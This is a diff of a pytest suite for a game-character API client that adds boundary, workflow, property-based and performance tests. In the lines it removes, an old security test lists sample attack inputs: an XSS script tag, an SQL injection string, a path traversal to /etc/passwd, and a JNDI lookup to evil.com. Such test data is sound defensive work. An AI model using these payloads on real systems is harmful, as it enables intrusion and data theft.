+    # PARAMETER VALIDATION AND BOUNDARY TESTING
+    # =============================================================================================
+
+    @pytest.mark.parametrize("boundary_values", [
+        # Integer boundaries
+        {"page": 0, "limit": 1},
+        {"page": 1, "limit": 0},
+        {"page": 2**31 - 1, "limit": 1},  # Max 32-bit int
+        {"page": 1, "limit": 2**31 - 1},
+        {"page": -2**31, "limit": 1},  # Min 32-bit int
+        {"page": 1, "limit": -2**31},
+        
+        # Floating point boundaries
+        {"page": 1.0, "limit": 20},
+        {"page": 1, "limit": 20.5},
+        
+        # Very large numbers
+        {"page": 10**100, "limit": 1},
+        {"page": 1, "limit": 10**100},
+    ])
+    @patch('requests.Session.get')
+    def test_parameter_boundary_values(self, mock_get, client, boundary_values):
+        """Test parameter validation with boundary values."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = []
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        # Should handle boundary values gracefully
+        try:
+            result = client.get_all_characters(**boundary_values)
+            assert isinstance(result, list)
+        except (TypeError, ValueError, OverflowError):
+            # Acceptable to reject invalid parameter types/values
+            pass
+
+    @pytest.mark.parametrize("search_params", [
+        # Empty string parameters
+        {"name": "", "character_class": "", "level_min": None, "level_max": None},
+        
+        # Whitespace-only parameters
+        {"name": "   ", "character_class": "\t\n", "level_min": None, "level_max": None},
+        
+        # Very long strings
+        {"name": "A" * 1000, "character_class": "B" * 500},
+        
+        # Special characters in all fields
+        {"name": "!@#$%^&*()", "character_class": "<>?:\"{}[]"},
+        
+        # Numeric strings where numbers expected
+        {"level_min": "10", "level_max": "20"},
+        
+        # Invalid ranges
+        {"level_min": 50, "level_max": 10},  # Min > Max
+    ])
+    @patch('requests.Session.get')
+    def test_search_parameter_edge_cases(self, mock_get, client, search_params):
+        """Test search functionality with edge case parameters."""
+        mock_response = Mock()
+        mock_response.status_code = 200
+        mock_response.json.return_value = []
+        mock_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_response
+
+        # Test if at least one parameter is provided (skip empty cases)
+        if any(v for v in search_params.values()):
+            try:
+                result = client.search_characters(**search_params)
+                assert isinstance(result, list)
+            except (TypeError, ValueError):
+                # Acceptable to reject invalid parameter combinations
+                pass
+
+    # =============================================================================================
+    # SESSION AND CONNECTION MANAGEMENT TESTS
+    # =============================================================================================
+
+    def test_session_state_consistency(self, client):
+        """Test that session state remains consistent across operations."""
+        original_headers = client.session.headers.copy()
+        original_session_id = id(client.session)
+        
+        # Perform multiple operations
+        with patch('requests.Session.get') as mock_get, \
+             patch('requests.Session.post') as mock_post:
+            
+            mock_response = Mock()
+            mock_response.status_code = 200
+            mock_response.json.return_value = {"id": 1}
+            mock_response.raise_for_status.return_value = None
+            mock_get.return_value = mock_response
+            mock_post.return_value = mock_response
+
+            # Multiple operations
+            client.get_character(1)
+            client.create_character({"name": "Test"})
+            client.get_all_characters()
+            client.search_characters(name="test")
+
+        # Verify session consistency
+        assert id(client.session) == original_session_id
+        assert client.session.headers == original_headers
+
+    def test_session_header_management(self, client_with_custom_session):
+        """Test proper management of session headers."""
+        client = client_with_custom_session
+        
+        # Verify initial headers
+        assert "Authorization" in client.session.headers
+        assert "User-Agent" in client.session.headers
+        assert "Accept-Language" in client.session.headers
+        
+        # Add additional headers
+        client.session.headers.update({
+            "X-Request-ID": "test-request-123",
+            "X-Client-Version": "1.0.0"
+        })
+        
+        # Verify headers persist
+        assert len(client.session.headers) >= 5
+        assert client.session.headers["X-Request-ID"] == "test-request-123"
+
+    # =============================================================================================
+    # INTEGRATION AND WORKFLOW TESTS
+    # =============================================================================================
+
+    @patch('requests.Session.post')
+    @patch('requests.Session.get') 
+    @patch('requests.Session.put')
+    @patch('requests.Session.delete')
+    def test_complete_character_management_workflow(self, mock_delete, mock_put, mock_get, mock_post, client):
+        """Test a complete character management workflow with multiple operations."""
+        # Setup mock responses for each operation
+        character_data = {"name": "Workflow Character", "class": "Wizard", "level": 1}
+        created_character = {"id": 1, **character_data}
+        updated_character = {**created_character, "level": 10, "experience": 5000}
+        
+        # Create
+        mock_post_response = Mock()
+        mock_post_response.status_code = 201
+        mock_post_response.json.return_value = created_character
+        mock_post_response.raise_for_status.return_value = None
+        mock_post.return_value = mock_post_response
+        
+        # Read (multiple calls)
+        mock_get_response = Mock()
+        mock_get_response.status_code = 200
+        mock_get_response.raise_for_status.return_value = None
+        mock_get.return_value = mock_get_response
+        
+        # First read returns created character
+        mock_get_response.json.return_value = created_character
+        
+        # Update
+        mock_put_response = Mock()
+        mock_put_response.status_code = 200
+        mock_put_response.json.return_value = updated_character
+        mock_put_response.raise_for_status.return_value = None
+        mock_put.return_value = mock_put_response
+        
+        # Delete
+        mock_delete_response = Mock()
+        mock_delete_response.status_code = 204
+        mock_delete_response.raise_for_status.return_value = None
+        mock_delete.return_value = mock_delete_response
+
+        # Execute workflow
+        # 1. Create character
+        created = client.create_character(character_data)
+        assert created["id"] == 1
+        assert created["name"] == "Workflow Character"
+        
+        # 2. Read created character
+        retrieved = client.get_character(1)
+        assert retrieved["id"] == 1
+        
+        # 3. Update character  
+        mock_get_response.json.return_value = updated_character  # Update mock for subsequent reads
+        updated = client.update_character(1, {"level": 10, "experience": 5000})
+        assert updated["level"] == 10
+        
+        # 4. Verify update
+        verified = client.get_character(1)
+        assert verified["level"] == 10
+        
+        # 5. Delete character
+        deleted = client.delete_character(1)
+        assert deleted is True
+        
+        # Verify all operations were called
+        mock_post.assert_called_once()
+        assert mock_get.call_count == 2
+        mock_put.assert_called_once()
+        mock_delete.assert_called_once()
+
+    @patch('requests.Session.get')
+    def test_search_pagination_workflow(self, mock_get, client):
+        """Test a complete search and pagination workflow."""
+        # Mock paginated search results
+        page1_results = [{"id": i, "name": f"Character {i}"} for i in range(1, 21)]
+        page2_results = [{"id": i, "name": f"Character {i}"} for i in range(21, 41)]
+        page3_results = [{"id": i, "name": f"Character {i}"} for i in range(41, 46)]
+        
+        search_response = Mock()
+        search_response.status_code = 200
+        search_response.raise_for_status.return_value = None
+        
+        # Configure different responses for each call
+        mock_get.side_effect = [
+            # Search call
+            Mock(status_code=200, json=lambda: {"results": page1_results, "total": 45}, raise_for_status=lambda: None),
+            # Page 1
+            Mock(status_code=200, json=lambda: page1_results, raise_for_status=lambda: None),
+            # Page 2  
+            Mock(status_code=200, json=lambda: page2_results, raise_for_status=lambda: None),
+            # Page 3
+            Mock(status_code=200, json=lambda: page3_results, raise_for_status=lambda: None),
+        ]
+
+        # Execute workflow
+        # 1. Initial search
+        search_results = client.search_characters(name="Character")
+        assert "total" in search_results or isinstance(search_results, list)
+        
+        # 2. Get paginated results
+        page1 = client.get_all_characters(page=1, limit=20)
+        assert len(page1) == 20
+        
+        page2 = client.get_all_characters(page=2, limit=20)
+        assert len(page2) == 20
+        
+        page3 = client.get_all_characters(page=3, limit=20)
+        assert len(page3) == 5  # Last page has fewer results
+        
+        # Verify all pages have unique characters
+        all_characters = page1 + page2 + page3
+        character_ids = [char["id"] for char in all_characters]
+        assert len(set(character_ids)) == 45  # All unique IDs
+        assert mock_get.call_count == 4
 
 
-# Performance and Load Testing
+# =============================================================================================
+# PROPERTY-BASED TESTING (Advanced)
+# =============================================================================================
+
+try:
+    from hypothesis import given, strategies as st, settings, assume
+    from hypothesis import HealthCheck
+
+    class TestCharacterClientPropertyBased:
+        """
+        Property-based tests using Hypothesis for comprehensive edge case coverage.
+        Testing framework: pytest with hypothesis
+        """
+
+        @given(
+            character_id=st.integers(min_value=1, max_value=1000000),
+            timeout_value=st.integers(min_value=1, max_value=300)
+        )
+        @settings(max_examples=50, suppress_health_check=[HealthCheck.function_scoped_fixture])
+        @patch('requests.Session.get')
+        def test_get_character_property_based(self, mock_get, character_id, timeout_value):
+            """Property test: get_character should work with any valid ID and timeout."""
+            sample_character = {"id": character_id, "name": f"Character {character_id}"}
+            
+            mock_response = Mock()
+            mock_response.status_code = 200
+            mock_response.json.return_value = sample_character
+            mock_response.raise_for_status.return_value = None
+            mock_get.return_value = mock_response
+
+            client = CharacterClient(timeout=timeout_value)
+            result = client.get_character(character_id)
+            
+            assert result["id"] == character_id
+            assert isinstance(result["name"], str)
+
+        @given(
+            name=st.text(min_size=1, max_size=100).filter(lambda x: x.strip()),
+            char_class=st.text(min_size=1, max_size=50).filter(lambda x: x.strip()),
+            level=st.integers(min_value=1, max_value=100)
+        )
+        @settings(max_examples=30)
+        @patch('requests.Session.post')
+        def test_create_character_property_based(self, mock_post, name, char_class, level):
+            """Property test: character creation with various valid inputs."""
+            character_data = {"name": name, "class": char_class, "level": level}
+            created_character = {"id": 1, **character_data}
+            
+            mock_response = Mock()
+            mock_response.status_code = 201
+            mock_response.json.return_value = created_character
+            mock_response.raise_for_status.return_value = None
+            mock_post.return_value = mock_response
+
+            client = CharacterClient()
+            result = client.create_character(character_data)
+            
+            assert result["name"] == name
+            assert result["class"] == char_class
+            assert result["level"] == level
+
+        @given(
+            page=st.integers(min_value=1, max_value=1000),
+            limit=st.integers(min_value=1, max_value=100)
+        )
+        @settings(max_examples=25)
+        @patch('requests.Session.get')
+        def test_pagination_properties(self, mock_get, page, limit):
+            """Property test: pagination should work with any reasonable values."""
+            mock_characters = [{"id": i, "name": f"Char {i}"} for i in range(limit)]
+            
+            mock_response = Mock()
+            mock_response.status_code = 200
+            mock_response.json.return_value = mock_characters
+            mock_response.raise_for_status.return_value = None
+            mock_get.return_value = mock_response
+
+            client = CharacterClient()
+            result = client.get_all_characters(page=page, limit=limit)
+            
+            assert isinstance(result, list)
+            assert len(result) <= limit
+
+        @given(
+            search_text=st.text(min_size=1, max_size=200),
+            min_level=st.integers(min_value=1, max_value=50),
+            max_level=st.integers(min_value=51, max_value=100)
+        )
+        @settings(max_examples=20)
+        @patch('requests.Session.get')
+        def test_search_parameters_property_based(self, mock_get, search_text, min_level, max_level):
+            """Property test: search should handle various parameter combinations."""
+            assume(min_level <= max_level)  # Ensure valid level range
+            
+            mock_response = Mock()
+            mock_response.status_code = 200
+            mock_response.json.return_value = []
+            mock_response.raise_for_status.return_value = None
+            mock_get.return_value = mock_response
+
+            client = CharacterClient()
+            result = client.search_characters(
+                name=search_text,
+                level_min=min_level,
+                level_max=max_level
+            )
+            
+            assert isinstance(result, list)
+
+except ImportError:
+    # Hypothesis not available, skip property-based tests
+    print("Hypothesis not available, skipping property-based tests")
+
+
+# =============================================================================================
+# BENCHMARK AND PERFORMANCE REGRESSION TESTS
+# =============================================================================================
+
 class TestCharacterClientPerformance:
-    """Performance-focused tests for CharacterClient."""
+    """
+    Performance and benchmark tests to detect regressions.
+    Testing framework: pytest
+    """
 
     @pytest.fixture
     def performance_client(self):
         """Client configured for performance testing."""
-        return CharacterClient(
-            base_url="https://api.test.com", 
-            api_key="perf_test_key",
-            timeout=5
-        )
+        return CharacterClient(base_url="https://api.test.com", timeout=1)
 
     @patch('requests.Session.get')
-    def test_bulk_character_retrieval_performance(self, mock_get, performance_client):
-        """Test performance characteristics of bulk character retrieval."""
-        # Simulate large response
-        large_character_list = [
-            {"id": i, "name": f"Character {i}", "level": i % 100 + 1}
-            for i in range(10000)
-        ]
+    def test_single_request_performance_baseline(self, mock_get, performance_client, sample_character):
+        """Establish performance baseline for single requests."""
+        import time
         
         mock_response = Mock()
         mock_response.status_code = 200
-        mock_response.json.return_value = large_character_list
+        mock_response.json.return_value = sample_character
         mock_response.raise_for_status.return_value = None
         mock_get.return_value = mock_response
 
-        result = performance_client.get_all_characters(limit=10000)
+        # Warm up
+        performance_client.get_character(1)
         
-        assert len(result) == 10000
-        assert result[0]["id"] == 0
-        assert result[9999]["id"] == 9999
-
-    def test_memory_usage_character_creation(self, performance_client):
-        """Test memory usage patterns during character creation."""
-        import sys
+        # Measure performance
+        start_time = time.perf_counter()
+        for _ in range(100):
+            performance_client.get_character(1)
+        end_time = time.perf_counter()
         
-        initial_size = sys.getsizeof(performance_client.__dict__)
+        total_time = end_time - start_time
+        avg_time = total_time / 100
         
-        # Create multiple characters (mocked)
-        with patch('requests.Session.post') as mock_post:
-            mock_response = Mock()
-            mock_response.status_code = 201
-            mock_response.json.return_value = {"id": 1, "name": "Test"}
-            mock_response.raise_for_status.return_value = None
-            mock_post.return_value = mock_response
-            
-            for i in range(100):
-                performance_client.create_character({"name": f"Test {i}", "class": "Warrior"})
-        
-        final_size = sys.getsizeof(performance_client.__dict__)
-        
-        # Object size should not grow significantly with usage
-        assert final_size <= initial_size * 1.1  # Allow for 10% growth
+        # Performance assertions (with mocks, these should be very fast)
+        assert total_time < 1.0  # 100 requests in under 1 second
+        assert avg_time < 0.01   # Average under 10ms per request
+        assert mock_get.call_count == 101  # 1 warmup + 100 measured
 
-
-# Error Recovery and Resilience Testing
-class TestCharacterClientResilience:
-    """Tests for error recovery and resilience."""
-
-    @pytest.fixture
-    def resilient_client(self):
-        """Client for resilience testing."""
-        return CharacterClient(base_url="https://api.test.com", timeout=10)
-
-    @patch('requests.Session.get')
-    def test_partial_response_handling(self, mock_get, resilient_client):
-        """Test handling of partial/incomplete responses."""
-        # Simulate incomplete character data
-        incomplete_character = {
-            "id": 1,
-            "name": "Incomplete Character"
-            # Missing class, level, stats, etc.
-        }
-        
-        mock_response = Mock()
-        mock_response.status_code = 200
-        mock_response.json.return_value = incomplete_character
-        mock_response.raise_for_status.return_value = None
-        mock_get.return_value = mock_response
-
-        result = resilient_client.get_character(1)
-        
-        # Should still return the partial data
-        assert result == incomplete_character
-        assert "name" in result
-        assert "class" not in result
-
-    @patch('requests.Session.get')
-    def test_malformed_json_response_handling(self, mock_get, resilient_client):
-        """Test handling of malformed JSON responses."""
-        mock_response = Mock()
-        mock_response.status_code = 200
-        mock_response.json.side_effect = json.JSONDecodeError("Malformed JSON", "response", 0)
-        mock_response.raise_for_status.return_value = None
-        mock_get.return_value = mock_response
-
-        with pytest.raises(json.JSONDecodeError):
-            resilient_client.get_character(1)
-
-    @patch('requests.Session.get')
-    def test_unexpected_response_structure(self, mock_get, resilient_client):
-        """Test handling of unexpected response structures."""
-        # Response that's a list instead of expected dict
-        unexpected_response = [{"id": 1, "name": "Test"}]
-        
-        mock_response = Mock()
-        mock_response.status_code = 200
-        mock_response.json.return_value = unexpected_response
-        mock_response.raise_for_status.return_value = None
-        mock_get.return_value = mock_response
-
-        result = resilient_client.get_character(1)
-        
-        # Should return whatever the API returns
-        assert result == unexpected_response
-        assert isinstance(result, list)
-
-
-# Input Sanitization and Security Tests
-class TestCharacterClientSecurity:
-    """Security-focused tests for CharacterClient."""
-
-    @pytest.fixture
-    def security_client(self):
-        """Client for security testing."""
-        return CharacterClient(base_url="https://api.test.com", api_key="security_key")
-
-    @pytest.mark.parametrize("malicious_input", [
-        {"name": "<script>alert('xss')</script>", "class": "Warrior"},
-        {"name": "'; DROP TABLE characters; --", "class": "Mage"},
-        {"name": "Test", "class": "../../etc/passwd"},
-        {"name": "${jndi:ldap://evil.com/a}", "class": "Warrior"},
-        {"name": "Test", "class": "\x00\x01\x02\x03"},  # Null bytes
-    ])
     @patch('requests.Session.post')
-    def test_malicious_input_handling(self, mock_post, security_client, malicious_input):
-        """Test handling of potentially malicious input data."""
+    def test_create_requests_performance(self, mock_post, performance_client, sample_character):
+        """Test performance of character creation requests."""
+        import time
+        
         mock_response = Mock()
         mock_response.status_code = 201
-        mock_response.json.return_value = malicious_input
+        mock_response.json.return_value = sample_character
         mock_response.raise_for_status.return_value = None
         mock_post.return_value = mock_response
 
-        # Should not raise errors and pass data as-is to API
-        result = security_client.create_character(malicious_input)
-        assert result == malicious_input
+        character_data = {"name": "Perf Test", "class": "Warrior", "level": 1}
+        
+        # Measure creation performance
+        start_time = time.perf_counter()
+        for i in range(50):
+            performance_client.create_character({**character_data, "name": f"Perf Test {i}"})
+        end_time = time.perf_counter()
+        
+        total_time = end_time - start_time
+        avg_time = total_time / 50
+        
+        assert total_time < 1.0  # 50 creates in under 1 second
+        assert avg_time < 0.02   # Average under 20ms per create
+        assert mock_post.call_count == 50
 
-    def test_api_key_header_format(self, security_client):
-        """Test that API key is properly formatted in Authorization header."""
-        auth_header = security_client.session.headers.get("Authorization")
-        assert auth_header == "Bearer security_key"
-        assert auth_header.startswith("Bearer ")
+    def test_memory_usage_stability(self, performance_client):
+        """Test that memory usage remains stable under load."""
+        import gc
+        import sys
+        
+        # Get initial memory usage (approximate)
+        gc.collect()
+        initial_objects = len(gc.get_objects())
+        
+        with patch('requests.Session.get') as mock_get:
+            mock_response = Mock()
+            mock_response.status_code = 200
+            mock_response.json.return_value = {"id": 1, "name": "Memory Test"}
+            mock_response.raise_for_status.return_value = None
+            mock_get.return_value = mock_response
 
-    @patch('requests.Session.get')
-    def test_unauthorized_access_simulation(self, mock_get, security_client):
-        """Test simulation of unauthorized access scenarios."""
-        mock_response = Mock()
-        mock_response.status_code = 401
-        mock_response.raise_for_status.side_effect = HTTPError("401 Unauthorized: Invalid token")
-        mock_get.return_value = mock_response
-
-        with pytest.raises(HTTPError, match="401 Unauthorized"):
-            security_client.get_character(1)
-
-
-# Data Type and Schema Validation Tests  
-class TestCharacterClientDataValidation:
-    """Tests for data type and schema validation."""
-
-    @pytest.fixture
-    def validation_client(self):
-        """Client for data validation testing."""
-        return CharacterClient(base_url="https://api.test.com")
-
-    @pytest.mark.parametrize("character_data,should_pass", [
-        ({"name": "Valid", "class": "Warrior"}, True),
-        ({"name": "", "class": "Warrior"}, False),  # Empty name
-        ({"name": None, "class": "Warrior"}, False),  # None name
-        ({}, False),  # Empty object
-        ({"class": "Warrior"}, False),  # Missing name
-        ({"name": "Test"}, True),  # Missing class (might be optional)
-    ])
-    def test_character_data_validation_rules(self, validation_client, character_data, should_pass):
-        """Test character data validation rules."""
-        if should_pass:
-            with patch('requests.Session.post') as mock_post:
-                mock_response = Mock()
-                mock_response.status_code = 201
-                mock_response.json.return_value = character_data
-                mock_response.raise_for_status.return_value = None
-                mock_post.return_value = mock_response
-                
-                result = validation_client.create_character(character_data)
-                assert result == character_data
-        else:
-            with pytest.raises(ValueError):
-                validation_client.create_character(character_data)
-
-    @pytest.mark.parametrize("search_criteria", [
-        {},  # No criteria
-        {"name": None, "character_class": None},  # All None
-        {"level_min": None, "level_max": None},  # All None levels
-    ])
-    def test_search_validation_empty_criteria(self, validation_client, search_criteria):
-        """Test search validation with empty or None criteria."""
-        with pytest.raises(ValueError, match="At least one search criterion must be provided"):
-            validation_client.search_characters(**search_criteria)
+            # Perform many operations
+            for i in range(1000):
+                performance_client.get_character(i)
+                if i % 100 == 0:
+                    gc.collect()  # Periodic cleanup
+        
+        # Check final memory usage
+        gc.collect()
+        final_objects = len(gc.get_objects())
+        
+        # Memory should not grow excessively (allow some growth for test artifacts)
+        memory_growth = final_objects - initial_objects
+        assert memory_growth < 1000  # Less than 1000 new objects retained
 
 
 if __name__ == '__main__':
-    # Run all tests with verbose output and coverage
-    pytest.main([__file__, '-v', '--tb=short', '--cov=character_client'])
+    # Run with comprehensive options
+    pytest.main([
+        __file__, 
+        '-v',                    # Verbose output
+        '--tb=short',           # Short traceback format
+        '--strict-markers',     # Strict marker handling
+        '--disable-warnings',   # Reduce noise
+        '-x',                   # Stop on first failure for debugging
+    ])
